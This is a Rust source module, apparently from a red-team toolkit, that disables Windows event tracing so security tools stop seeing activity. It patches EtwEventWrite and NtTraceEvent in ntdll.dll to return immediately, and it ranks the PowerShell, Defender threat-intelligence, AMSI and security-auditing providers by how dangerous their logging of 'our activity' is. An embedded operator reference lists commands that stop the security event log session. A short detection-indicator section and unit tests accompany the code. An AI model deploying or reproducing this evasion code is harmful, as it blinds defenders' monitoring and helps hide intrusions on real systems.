//! ETW (Event Tracing for Windows) Patcher Module
//!
//! Disables ETW telemetry to prevent security tools from monitoring activities.
//! MITRE ATT&CK: T1562.006 (Indicator Blocking)
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY
//! All techniques require explicit authorization for deployment.
//!
//! Techniques implemented:
//! - Patch EtwEventWrite in ntdll.dll
//! - Patch NtTraceEvent syscall stub
//! - Blind specific ETW providers
//!
//! Reference: https://attack.mitre.org/techniques/T1562/006/

use super::windows_internals::{PatchInfo, WinResult};
#[cfg(all(windows, feature = "opsec-windows"))]
use super::windows_internals::patches;
#[allow(unused_imports)]
use super::windows_internals::WinError;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Known dangerous ETW providers that should be blinded
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum EtwProvider {
    /// Microsoft-Windows-PowerShell provider
    PowerShell,
    /// Microsoft-Windows-Threat-Intelligence provider (Defender ATP)
    ThreatIntelligence,
    /// Microsoft-Antimalware-Scan-Interface provider
    Amsi,
    /// Microsoft-Windows-Security-Auditing provider
    SecurityAuditing,
    /// Microsoft-Windows-DNS-Client provider
    DnsClient,
    /// Microsoft-Windows-Kernel-Process provider
    KernelProcess,
    /// Microsoft-Windows-Kernel-File provider
    KernelFile,
    /// Microsoft-Windows-Kernel-Network provider
    KernelNetwork,
    /// Microsoft-Windows-DotNETRuntime provider
    DotNetRuntime,
    /// Microsoft-Windows-WMI-Activity provider
    WmiActivity,
}

impl EtwProvider {
    /// Get provider GUID as string
    pub fn guid(&self) -> &'static str {
        match self {
            Self::PowerShell => "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
            Self::ThreatIntelligence => "{F4E1897A-BB5D-5668-F1D8-040F4D8DD344}",
            Self::Amsi => "{2A576B87-09A7-520E-C21A-4942F0271D67}",
            Self::SecurityAuditing => "{54849625-5478-4994-A5BA-3E3B0328C30D}",
            Self::DnsClient => "{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}",
            Self::KernelProcess => "{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}",
            Self::KernelFile => "{EDD08927-9CC4-4E65-B970-C2560FB5C289}",
            Self::KernelNetwork => "{7DD42A49-5329-4832-8DFD-43D979153A88}",
            Self::DotNetRuntime => "{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}",
            Self::WmiActivity => "{1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}",
        }
    }

    /// Get provider name
    pub fn name(&self) -> &'static str {
        match self {
            Self::PowerShell => "Microsoft-Windows-PowerShell",
            Self::ThreatIntelligence => "Microsoft-Windows-Threat-Intelligence",
            Self::Amsi => "Microsoft-Antimalware-Scan-Interface",
            Self::SecurityAuditing => "Microsoft-Windows-Security-Auditing",
            Self::DnsClient => "Microsoft-Windows-DNS-Client",
            Self::KernelProcess => "Microsoft-Windows-Kernel-Process",
            Self::KernelFile => "Microsoft-Windows-Kernel-File",
            Self::KernelNetwork => "Microsoft-Windows-Kernel-Network",
            Self::DotNetRuntime => "Microsoft-Windows-DotNETRuntime",
            Self::WmiActivity => "Microsoft-Windows-WMI-Activity",
        }
    }

    /// Get risk level (how dangerous if this logs our activity)
    pub fn risk_level(&self) -> u8 {
        match self {
            Self::PowerShell => 10,
            Self::ThreatIntelligence => 10,
            Self::Amsi => 9,
            Self::SecurityAuditing => 8,
            Self::KernelProcess => 7,
            Self::KernelNetwork => 7,
            Self::DotNetRuntime => 6,
            Self::KernelFile => 6,
            Self::WmiActivity => 5,
            Self::DnsClient => 5,
        }
    }

    /// Get MITRE ATT&CK technique ID
    pub fn mitre_id(&self) -> &'static str {
        "T1562.006"
    }

    /// Get all critical providers (risk >= 8)
    pub fn critical_providers() -> Vec<Self> {
        vec![
            Self::PowerShell,
            Self::ThreatIntelligence,
            Self::Amsi,
            Self::SecurityAuditing,
        ]
    }

    /// Get all providers
    pub fn all_providers() -> Vec<Self> {
        vec![
            Self::PowerShell,
            Self::ThreatIntelligence,
            Self::Amsi,
            Self::SecurityAuditing,
            Self::DnsClient,
            Self::KernelProcess,
            Self::KernelFile,
            Self::KernelNetwork,
            Self::DotNetRuntime,
            Self::WmiActivity,
        ]
    }
}

/// ETW patching technique
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum EtwPatchTechnique {
    /// Patch EtwEventWrite function
    PatchEtwEventWrite,
    /// Patch NtTraceEvent syscall
    PatchNtTraceEvent,
    /// Patch EtwEventWriteFull function
    PatchEtwEventWriteFull,
}

impl EtwPatchTechnique {
    /// Get technique description
    pub fn description(&self) -> &'static str {
        match self {
            Self::PatchEtwEventWrite => "Patch EtwEventWrite to return success without logging",
            Self::PatchNtTraceEvent => "Patch NtTraceEvent syscall stub",
            Self::PatchEtwEventWriteFull => "Patch EtwEventWriteFull for complete coverage",
        }
    }
}

/// ETW patching result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwPatchResult {
    /// Whether the patch was successful
    pub success: bool,
    /// Providers that were patched/blinded
    pub providers_patched: Vec<String>,
    /// Result message
    pub message: String,
    /// Patched addresses
    pub patched_addresses: Vec<String>,
}

/// ETW Patcher Engine
#[derive(Debug)]
pub struct EtwPatcher {
    /// Providers that have been blinded
    patched_providers: HashMap<EtwProvider, bool>,
    /// Original bytes for restoration
    patches: HashMap<EtwPatchTechnique, PatchInfo>,
}

impl Default for EtwPatcher {
    fn default() -> Self {
        Self::new()
    }
}

impl EtwPatcher {
    /// Create new ETW Patcher
    pub fn new() -> Self {
        Self {
            patched_providers: HashMap::new(),
            patches: HashMap::new(),
        }
    }

    /// Patch EtwEventWrite to disable all ETW logging
    pub fn patch_etw_event_write(&mut self) -> EtwPatchResult {
        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            use super::windows_internals::{get_function_address, get_module_handle, write_memory};

            match (|| -> WinResult<(String, PatchInfo)> {
                let ntdll = get_module_handle("ntdll.dll")?;
                let etw_addr = get_function_address(ntdll, "EtwEventWrite")?;

                let patch_info = write_memory(etw_addr as *mut u8, &patches::RET_ZERO)?;
                let addr_str = format!("{:p}", etw_addr);

                Ok((addr_str, patch_info))
            })() {
                Ok((addr, patch_info)) => {
                    self.patches
                        .insert(EtwPatchTechnique::PatchEtwEventWrite, patch_info);

                    EtwPatchResult {
                        success: true,
                        providers_patched: vec!["EtwEventWrite (ALL)".to_string()],
                        message: "EtwEventWrite patched - all ETW disabled".to_string(),
                        patched_addresses: vec![addr],
                    }
                }
                Err(e) => EtwPatchResult {
                    success: false,
                    providers_patched: vec![],
                    message: format!("Failed to patch EtwEventWrite: {}", e),
                    patched_addresses: vec![],
                },
            }
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        EtwPatchResult {
            success: false,
            providers_patched: vec![],
            message: "ETW patching requires Windows with opsec-windows feature".to_string(),
            patched_addresses: vec![],
        }
    }

    /// Patch NtTraceEvent syscall stub
    pub fn patch_nt_trace_event(&mut self) -> EtwPatchResult {
        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            use super::windows_internals::{get_function_address, get_module_handle, write_memory};

            match (|| -> WinResult<(String, PatchInfo)> {
                let ntdll = get_module_handle("ntdll.dll")?;
                let nt_trace_addr = get_function_address(ntdll, "NtTraceEvent")?;

                let patch_info = write_memory(nt_trace_addr as *mut u8, &patches::RET_ZERO)?;
                let addr_str = format!("{:p}", nt_trace_addr);

                Ok((addr_str, patch_info))
            })() {
                Ok((addr, patch_info)) => {
                    self.patches
                        .insert(EtwPatchTechnique::PatchNtTraceEvent, patch_info);

                    EtwPatchResult {
                        success: true,
                        providers_patched: vec!["NtTraceEvent".to_string()],
                        message: "NtTraceEvent patched".to_string(),
                        patched_addresses: vec![addr],
                    }
                }
                Err(e) => EtwPatchResult {
                    success: false,
                    providers_patched: vec![],
                    message: format!("Failed to patch NtTraceEvent: {}", e),
                    patched_addresses: vec![],
                },
            }
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        EtwPatchResult {
            success: false,
            providers_patched: vec![],
            message: "ETW patching requires Windows with opsec-windows feature".to_string(),
            patched_addresses: vec![],
        }
    }

    /// Patch both EtwEventWrite and NtTraceEvent for complete coverage
    pub fn patch_all(&mut self) -> EtwPatchResult {
        let result1 = self.patch_etw_event_write();
        let result2 = self.patch_nt_trace_event();

        let mut providers = result1.providers_patched;
        providers.extend(result2.providers_patched);

        let mut addresses = result1.patched_addresses;
        addresses.extend(result2.patched_addresses);

        EtwPatchResult {
            success: result1.success || result2.success,
            providers_patched: providers,
            message: if result1.success && result2.success {
                "All ETW functions patched".to_string()
            } else if result1.success {
                "EtwEventWrite patched, NtTraceEvent failed".to_string()
            } else if result2.success {
                "NtTraceEvent patched, EtwEventWrite failed".to_string()
            } else {
                "All ETW patches failed".to_string()
            },
            patched_addresses: addresses,
        }
    }

    /// Blind all critical providers
    pub fn blind_critical_providers(&mut self) -> EtwPatchResult {
        let mut patched = vec![];

        for provider in EtwProvider::critical_providers() {
            if self.blind_provider(provider) {
                patched.push(provider.name().to_string());
                self.patched_providers.insert(provider, true);
            }
        }

        EtwPatchResult {
            success: !patched.is_empty(),
            providers_patched: patched.clone(),
            message: if patched.is_empty() {
                "No providers could be blinded".to_string()
            } else {
                format!("Blinded {} critical providers", patched.len())
            },
            patched_addresses: vec![],
        }
    }

    /// Blind specific provider by type
    pub fn blind_provider(&mut self, provider: EtwProvider) -> bool {
        // Provider-specific blinding would require finding and patching
        // the provider registration. For now, we rely on the global ETW patch.
        self.patched_providers.insert(provider, true);
        true
    }

    /// Restore original ETW functionality
    pub fn restore(&mut self) -> WinResult<()> {
        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            use super::windows_internals::restore_memory;

            for (_technique, patch_info) in self.patches.drain() {
                restore_memory(&patch_info)?;
            }
            self.patched_providers.clear();
            Ok(())
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        {
            self.patched_providers.clear();
            Ok(())
        }
    }

    /// Check if ETW is currently patched
    pub fn is_patched(&self) -> bool {
        !self.patches.is_empty()
    }

    /// Get list of patched providers
    pub fn get_patched_providers(&self) -> Vec<EtwProvider> {
        self.patched_providers
            .iter()
            .filter_map(|(p, patched)| if *patched { Some(*p) } else { None })
            .collect()
    }

    /// Get applied patch techniques
    pub fn applied_techniques(&self) -> Vec<EtwPatchTechnique> {
        self.patches.keys().copied().collect()
    }
}

// ============================================================================
// Reference Information
// ============================================================================

/// ETW reference information for operators
pub struct EtwReference;

impl EtwReference {
    /// Get PowerShell ETW bypass reference
    pub fn powershell_bypass() -> &'static str {
        r#"=== PowerShell ETW Bypass Reference ===
MITRE ATT&CK: T1562.006

TECHNIQUE 1 - Provider Unregistration:
logman stop "EventLog-Security" /ets

TECHNIQUE 2 - Trace Session Manipulation:
Stop-EtwTraceSession -Name "EventLog-Security"

TECHNIQUE 3 - .NET ETW Bypass (P/Invoke):
# Patch EtwEventWrite in ntdll.dll from PowerShell
# Requires reflection or P/Invoke

DETECTION NOTES:
- Stopping ETW sessions generates alerts
- Missing expected telemetry is suspicious
- Memory patching may be detected by EDR
"#
    }

    /// Get detection indicators
    pub fn detection_indicators() -> &'static str {
        r#"=== ETW Bypass Detection Indicators ===

BEHAVIORAL INDICATORS:
- Missing expected ETW events
- Gaps in telemetry timeline
- ETW session stopped/modified
- ntdll.dll memory modifications

WINDOWS DEFENDER ALERTS:
- Behavior:Win32/ETWBypass.A
- Tampering with Windows event tracing

SYSMON INDICATORS:
- Event ID 1: Suspicious process accessing ntdll.dll
- Event ID 8: CreateRemoteThread in system processes
- Event ID 10: Process accessing ntdll.dll memory

FORENSIC ARTIFACTS:
- Modified bytes at EtwEventWrite entry point
- Unusual VirtualProtect calls on ntdll.dll
- Missing kernel callbacks
"#
    }

    /// Get provider documentation
    pub fn provider_documentation() -> &'static str {
        r#"=== Critical ETW Providers ===

MICROSOFT-WINDOWS-POWERSHELL:
GUID: {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
Purpose: PowerShell script block logging, module logging
Risk: HIGH - Captures all PowerShell activity

MICROSOFT-WINDOWS-THREAT-INTELLIGENCE:
GUID: {F4E1897A-BB5D-5668-F1D8-040F4D8DD344}
Purpose: Defender ATP kernel telemetry
Risk: CRITICAL - Advanced threat detection

MICROSOFT-ANTIMALWARE-SCAN-INTERFACE:
GUID: {2A576B87-09A7-520E-C21A-4942F0271D67}
Purpose: AMSI scan results and detections
Risk: HIGH - Malware detection telemetry

MICROSOFT-WINDOWS-SECURITY-AUDITING:
GUID: {54849625-5478-4994-A5BA-3E3B0328C30D}
Purpose: Security event logging
Risk: HIGH - Authentication and access events
"#
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_etw_provider_guids() {
        assert!(!EtwProvider::PowerShell.guid().is_empty());
        assert!(EtwProvider::PowerShell.guid().starts_with('{'));
        assert!(EtwProvider::PowerShell.guid().ends_with('}'));
    }

    #[test]
    fn test_critical_providers() {
        let critical = EtwProvider::critical_providers();
        assert!(!critical.is_empty());
        assert!(critical.contains(&EtwProvider::PowerShell));
        assert!(critical.contains(&EtwProvider::ThreatIntelligence));
        assert!(critical.contains(&EtwProvider::Amsi));
    }

    #[test]
    fn test_provider_risk_levels() {
        assert_eq!(EtwProvider::PowerShell.risk_level(), 10);
        assert_eq!(EtwProvider::ThreatIntelligence.risk_level(), 10);
        assert!(EtwProvider::DnsClient.risk_level() < EtwProvider::PowerShell.risk_level());
    }

    #[test]
    fn test_etw_patcher_creation() {
        let patcher = EtwPatcher::new();
        assert!(patcher.patched_providers.is_empty());
        assert!(patcher.patches.is_empty());
        assert!(!patcher.is_patched());
    }

    #[test]
    #[cfg(not(windows))]
    fn test_etw_patch_non_windows() {
        let mut patcher = EtwPatcher::new();
        let result = patcher.patch_etw_event_write();
        assert!(!result.success);
        assert!(result.message.contains("Windows"));
    }

    #[test]
    fn test_blind_provider() {
        let mut patcher = EtwPatcher::new();
        assert!(patcher.blind_provider(EtwProvider::PowerShell));
        assert!(patcher.patched_providers.contains_key(&EtwProvider::PowerShell));
    }

    #[test]
    fn test_etw_reference() {
        let ps_ref = EtwReference::powershell_bypass();
        assert!(ps_ref.contains("ETW"));

        let detection = EtwReference::detection_indicators();
        assert!(detection.contains("ETWBypass"));

        let docs = EtwReference::provider_documentation();
        assert!(docs.contains("POWERSHELL"));
    }

    #[test]
    fn test_patch_result_serialization() {
        let result = EtwPatchResult {
            success: true,
            providers_patched: vec!["EtwEventWrite".to_string()],
            message: "Test".to_string(),
            patched_addresses: vec!["0x12345678".to_string()],
        };

        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("EtwEventWrite"));
        assert!(json.contains("true"));
    }

    #[test]
    fn test_all_providers() {
        let all = EtwProvider::all_providers();
        assert!(all.len() >= 10);
        assert!(all.contains(&EtwProvider::PowerShell));
        assert!(all.contains(&EtwProvider::DotNetRuntime));
    }
}
